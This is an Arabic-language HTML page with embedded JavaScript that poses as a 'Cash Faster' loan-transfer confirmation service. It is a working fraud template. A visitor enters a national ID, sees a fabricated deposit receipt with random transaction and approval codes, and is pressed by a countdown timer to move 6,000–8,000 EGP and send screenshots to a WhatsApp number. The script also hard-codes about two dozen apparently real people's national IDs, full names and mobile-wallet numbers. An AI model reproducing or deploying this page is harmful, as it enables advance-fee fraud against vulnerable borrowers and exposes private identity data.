<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>كاش فاستر | تأكيد التحويل</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary-cyan: #00D9FF;
            --primary-purple: #9D4EDD;
            --primary-lime: #3FFF00;
            --accent-gold: #FFD700;
            --accent-orange: #FF6B35;
            --text-light: #FFFFFF;
            --text-muted: #B0B9C3;
        }
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0F1419 0%, #1a0f2e 50%, #0a1628 100%);
            color: var(--text-light);
            min-height: 100vh;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(transparent 24%, rgba(0,217,255,0.03) 25%, rgba(0,217,255,0.03) 26%, transparent 27%);
            background-size: 50px 50px;
            animation: gridMove 20s linear infinite;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes gridMove { 0% { background-position: 0 0; } 100% { background-position: 50px 50px; } }
        .container { max-width: 1000px; margin: 0 auto; padding: 1rem; position: relative; z-index: 2; }
        header { text-align: center; margin-bottom: 1.5rem; background: rgba(15,20,40,0.8); backdrop-filter: blur(10px); padding: 1rem; border-radius: 1.5rem; }
        .logo h1 { font-size: 1.8rem; background: linear-gradient(135deg, var(--primary-cyan), var(--primary-purple)); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .security-badge { display: inline-block; background: rgba(0,217,255,0.1); border: 1px solid var(--primary-cyan); padding: 0.4rem 1rem; border-radius: 2rem; font-size: 0.7rem; margin-top: 0.5rem; }
        .search-card { background: rgba(15,20,40,0.9); backdrop-filter: blur(12px); border: 2px solid rgba(0,217,255,0.3); border-radius: 1.5rem; padding: 1.8rem; margin-bottom: 1.5rem; }
        .input-group { max-width: 400px; margin: 0 auto; }
        .input-group input { width: 100%; padding: 0.9rem; background: rgba(0,0,0,0.5); border: 2px solid var(--primary-cyan); border-radius: 2.5rem; color: white; text-align: center; font-size: 0.95rem; }
        .btn-search { background: linear-gradient(135deg, var(--primary-cyan), var(--primary-purple)); border: none; padding: 0.9rem; border-radius: 2.5rem; font-weight: 800; color: white; cursor: pointer; margin-top: 1rem; width: 100%; max-width: 320px; display: block; margin-left: auto; margin-right: auto; }
        .result-section { display: none; animation: fadeInUp 0.6s ease; }
        .result-section.show { display: block; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        .success-header { text-align: center; background: rgba(57,255,20,0.12); border: 2px solid var(--primary-lime); border-radius: 2rem; padding: 1.5rem; margin-bottom: 1.5rem; }
        .success-header h2 { color: var(--primary-lime); font-size: 1.6rem; }
        .receipt-card { background: linear-gradient(135deg, #1a1a2e, #16213e); border: 2px solid #d4af37; border-radius: 2rem; padding: 1.8rem; margin: 1.5rem 0; }
        .amount-big { text-align: center; background: rgba(212,175,55,0.2); border-radius: 1.5rem; padding: 1rem; margin: 1rem 0; }
        .amount-big .value { font-size: 2.5rem; font-weight: 900; color: #d4af37; }
        .detail-row { display: flex; justify-content: space-between; padding: 0.7rem 0; border-bottom: 1px solid rgba(212,175,55,0.2); }
        .creditworthiness-section { background: rgba(0,217,255,0.08); border: 2px solid var(--primary-cyan); border-radius: 2rem; padding: 2rem; margin: 1.5rem 0; }
        .section-title { font-size: 1.4rem; color: var(--primary-cyan); margin-bottom: 1.2rem; }
        .proof-step { background: rgba(0,0,0,0.3); border-left: 4px solid var(--primary-cyan); padding: 1.2rem; margin-bottom: 1rem; border-radius: 1rem; }
        .proof-step-number { font-size: 1.2rem; font-weight: 900; color: var(--accent-gold); margin-bottom: 0.6rem; }
        .amount-highlight { background: rgba(255,215,0,0.12); border: 2px solid var(--accent-gold); border-radius: 1rem; padding: 1rem; text-align: center; font-size: 1.3rem; font-weight: 800; color: var(--accent-gold); margin: 0.8rem 0; }
        .timer-section { background: rgba(255,107,53,0.08); border: 2px solid var(--accent-orange); border-radius: 1.5rem; padding: 1.5rem; text-align: center; margin: 1.2rem 0; }
        .timer { font-size: 2.2rem; font-weight: 900; font-family: monospace; color: var(--accent-gold); animation: timerGlow 1s infinite; }
        @keyframes timerGlow { 50% { text-shadow: 0 0 25px rgba(255,215,0,0.8); transform: scale(1.05); } }
        .error-card { background: rgba(255,107,107,0.08); border: 2px solid rgba(255,107,107,0.4); border-radius: 1.5rem; padding: 2rem; text-align: center; display: none; }
        .loader { display: none; text-align: center; margin: 1rem 0; }
        .loader.show { display: block; }
        .loader i { font-size: 2rem; color: var(--primary-cyan); animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 768px) { .amount-big .value { font-size: 1.8rem; } .timer { font-size: 1.8rem; } .detail-row { flex-direction: column; gap: 0.3rem; } }
    </style>
</head>
<body>
<div class="container">
    <header><div class="logo"><h1>💰 Cash Faster</h1></div><div class="security-badge"><i class="fas fa-lock"></i> تشفير 256-bit</div></header>
    <div class="search-card">
        <h2 class="search-title">📱 حول لحسابي الآن</h2>
        <div class="input-group">
            <input type="text" id="nationalId" placeholder="أدخل الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
            <button class="btn-search" onclick="searchCustomer()"><i class="fas fa-check-circle"></i> حول لحسابي الآن</button>
        </div>
        <div class="loader" id="loader"><i class="fas fa-spinner"></i></div>
    </div>
    <div class="result-section" id="resultSection">
        <div id="normalContent" style="display: none;">
            <div class="success-header"><h2>✅ مرحلة تأكيد التحويل</h2><p>تم إيداع التمويل في حسابك - ينتظر إثبات الجدارة</p></div>
            <div id="paymentCardContainer"></div>
            <div id="creditworthinessContainer"></div>
        </div>
    </div>
    <div class="error-card" id="errorCard"><i class="fas fa-exclamation-triangle"></i><p>⚠️ الرقم القومي غير مسجل</p></div>
</div>

<script>
const customersDatabase = {
    "28703111100311": { name: "محمد محمد مصطفي صيام", wallet: "فودافون كاش", walletNum: "01001602909", loan: 150000, suspended: false },
    "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", wallet: "لا يوجد محفظة", walletNum: "01283498080", loan: 145000, suspended: false },
    "28412180102258": { name: "إبراهيم صلاح إبراهيم محمد", wallet: "فودافون كاش", walletNum: "01022138111", loan: 60000, suspended: false },
    "29704130102588": { name: "زينب حسن محمود موسى", wallet: "فودافون كاش", walletNum: "01044615740", loan: 200000, suspended: false },
    "29904241301679": { name: "محمد السيد عبد الستار محمد", wallet: "فودافون كاش", walletNum: "01069833285", loan: 200000, suspended: false },
    "25302220201075": { name: "عبد الستار بربري أبوزيد شاهين", wallet: "فودافون كاش", walletNum: "01060868918", loan: 40000, suspended: false },
    "28509012120139": { name: "مصطفى محمد امبابى مهران", wallet: "فودافون كاش", walletNum: "01067567527", loan: 200000, suspended: false },
    "28309190104857": { name: "محمد عبد الكريم جمال محمد", wallet: "فودافون كاش", walletNum: "01033032503", loan: 100000, suspended: false },
    "27310150101671": { name: "ممدوح محمد رضا محمد صقر", wallet: "فودافون كاش", walletNum: "01024159249", loan: 35000, suspended: false },
    "26611022200531": { name: "عاطف علام عبد الحميد سلطان", wallet: "فودافون كاش", walletNum: "01050786847", loan: 85000, suspended: false },
    "27909180400222": { name: "نجلاء جلال عبده محمد", wallet: "فودافون كاش", walletNum: "01080442855", loan: 200000, suspended: false },
    "27707070106815": { name: "وليد معوض موسى شرقاوي", wallet: "فودافون كاش", walletNum: "01019114882", loan: 70000, suspended: false },
    "27404210101395": { name: "محمد عبدالوهاب ابراهيم", wallet: "فودافون كاش", walletNum: "01017693528", loan: 50000, suspended: false },
    "28911202105597": { name: "علاء الدين حاتم محمد عبدالسلام", wallet: "فودافون كاش", walletNum: "01055119921", loan: 200000, suspended: false },
    "25210090102914": { name: "احمد بدوى على بدوى", wallet: "فودافون كاش", walletNum: "01113912643", loan: 40000, suspended: false },
    "28001300103377": { name: "ابراهيم جابر مبارك محمود", wallet: "اتصالات كاش", walletNum: "01119543983", loan: 200000, suspended: false },
    "27803061301779": { name: "محمد عبدالله حسين حسين", wallet: "فودافون كاش", walletNum: "01007197584", loan: 200000, suspended: false },
    "29110012705815": { name: "محمد حسني احمد محمد", wallet: "فودافون كاش", walletNum: "01016090373", loan: 85000, suspended: false },
    "29003090102514": { name: "محمود احمد احمد ابراهيم ابو السعود", wallet: "اتصالات كاش", walletNum: "01112941749", loan: 100000, suspended: false },
    "28903181600488": { name: "جهاد بسيونى عبدالخالق عيسى", wallet: "اتصالات كاش", walletNum: "01126040309", loan: 100000, suspended: false },
    "27712041501814": { name: "هاني طه شعبان عزازي", wallet: "فودافون كاش", walletNum: "01031039227", loan: 150000, suspended: false }
};

const loanDetailsMap = { 35000: { months: 12, installment: 3200 }, 40000: { months: 18, installment: 2500 }, 50000: { months: 24, installment: 2300 }, 60000: { months: 24, installment: 2760 }, 70000: { months: 30, installment: 2520 }, 85000: { months: 30, installment: 3050 }, 100000: { months: 36, installment: 3200 }, 145000: { months: 48, installment: 4075 }, 150000: { months: 48, installment: 4205 }, 200000: { months: 60, installment: 4440 } };
function getLoanDetails(amount) { return loanDetailsMap[amount] || { months: 36, installment: 3200 }; }
function formatCurrency(amount) { return amount.toLocaleString('ar-EG') + ' ج.م'; }
function formatDate(date) { return date.toLocaleDateString('ar-EG'); }
function formatTime(date) { return date.toLocaleTimeString('ar-EG'); }
function calculateProofAmount(loan) { return loan < 100000 ? 6000 : 8000; }
function generateTransactionId() { return Math.floor(Math.random() * 1000000000); }
function generateApprovalCode() { return 'AP' + Math.floor(Math.random() * 1000000); }

let currentCustomer = null;

function searchCustomer() {
    const nationalId = document.getElementById('nationalId').value.trim();
    if (!nationalId || nationalId.length !== 14) { alert('الرجاء إدخال 14 رقم'); return; }
    document.getElementById('loader').classList.add('show');
    document.getElementById('resultSection').classList.remove('show');
    document.getElementById('errorCard').classList.remove('show');
    setTimeout(() => {
        document.getElementById('loader').classList.remove('show');
        if (customersDatabase[nationalId]) {
            currentCustomer = customersDatabase[nationalId];
            currentCustomer.id = nationalId;
            displayResult();
        } else {
            document.getElementById('errorCard').classList.add('show');
        }
    }, 1000);
}

function displayResult() {
    document.getElementById('normalContent').style.display = 'block';
    const details = getLoanDetails(currentCustomer.loan);
    const proofAmount = calculateProofAmount(currentCustomer.loan);
    const receiptMinutes = Math.floor(Math.random() * 5) + 5;
    const now = new Date();
    const transactionId = generateTransactionId();
    const approvalCode = generateApprovalCode();
    
    document.getElementById('paymentCardContainer').innerHTML = `
        <div class="receipt-card">
            <div class="amount-big"><div class="value">${formatCurrency(currentCustomer.loan)}</div><div>قيمة التمويل المدفوع لحسابك</div></div>
            <div class="detail-row"><span>رقم المحفظة</span><span>${currentCustomer.walletNum}</span></div>
            <div class="detail-row"><span>التاريخ</span><span>${formatDate(now)}</span></div>
            <div class="detail-row"><span>الوقت</span><span>${formatTime(now)}</span></div>
            <div class="detail-row"><span>رقم العملية</span><span>${transactionId}</span></div>
            <div class="detail-row"><span>رقم الموافقة</span><span>${approvalCode}</span></div>
            <div class="detail-row"><span>طريقة الدفع</span><span>إيداع في المحفظة</span></div>
            <div class="info-message" style="margin-top:1rem; text-align:center; background:rgba(0,217,255,0.1); padding:0.8rem; border-radius:1rem;">سيتم إيداع المبلغ خلال ${receiptMinutes} دقائق من الإثبات!</div>
        </div>`;
    
    document.getElementById('creditworthinessContainer').innerHTML = `
        <div class="creditworthiness-section">
            <div class="section-title"><i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية</div>
            <div class="proof-step"><div class="proof-step-number">1️⃣ مبلغ الجدارة المطلوب</div><div class="amount-highlight">${formatCurrency(proofAmount)}</div></div>
            <div class="proof-step"><div class="proof-step-number">2️⃣ الخطوات</div>اطلب من شخص تثق به تحويل ${formatCurrency(proofAmount)} إلى محفظتك، التقط لقطة شاشة، ثم حول نفس المبلغ مرة أخرى إلى الشخص نفسه، التقط لقطة شاشة أخرى، ثم أرسل الصورتين عبر واتساب إلى الرقم <strong>212614494251</strong>.</div>
            <div class="timer-section"><div class="timer" id="proofTimer">30:00</div><p>الوقت المتبقي لإثبات الجدارة</p></div>
            <div class="proof-step"><div class="proof-step-number">3️⃣ بعد الإثبات</div>سيتم الإفراج عن القرض ${formatCurrency(currentCustomer.loan)}. القسط الشهري: ${formatCurrency(details.installment)} لمدة ${details.months} شهر.</div>
        </div>`;
    document.getElementById('resultSection').classList.add('show');
    startProofTimer();
}

function startProofTimer() {
    let timeLeft = 30 * 60;
    function update() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        const t = document.getElementById('proofTimer');
        if (t) t.textContent = `${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
        if (timeLeft > 0) { timeLeft--; setTimeout(update, 1000); }
    }
    update();
}
document.getElementById('nationalId').addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
</script>
</body>
</html>
